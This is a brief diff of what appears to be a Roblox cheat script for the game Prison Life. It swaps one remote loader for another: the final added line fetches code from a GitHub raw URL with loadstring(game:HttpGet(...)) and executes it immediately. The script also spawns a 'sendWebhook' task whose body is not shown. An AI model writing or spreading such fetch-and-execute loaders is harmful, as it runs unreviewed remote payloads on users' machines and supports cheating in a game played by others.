@@ -1,6 +1,5 @@
 -- Main Script Precision | Prison Life
 
-local redzlib = loadstring(game:HttpGet("https://raw.githubusercontent.com/maplez211/Loader/main/redzidk"))()
 local Players = game:GetService("Players")
 local player = Players.LocalPlayer
 local RunService = game:GetService("RunService")
@@ -664,3 +663,5 @@ local function sendWebhook()
 end
 
 task.spawn(sendWebhook)
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/maplez211/prison-life/refs/heads/main/UI"))()
